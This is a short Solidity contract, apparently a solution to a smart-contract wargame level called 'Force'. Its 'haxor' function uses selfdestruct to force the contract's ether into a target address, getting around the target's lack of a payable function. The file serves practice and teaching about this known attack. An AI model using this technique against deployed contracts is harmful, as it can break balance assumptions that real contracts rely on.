pragma solidity 0.4.18;

contract Force {
    
    function () public payable {}
    
    function haxor(address target) public {
        selfdestruct(target);
    }
}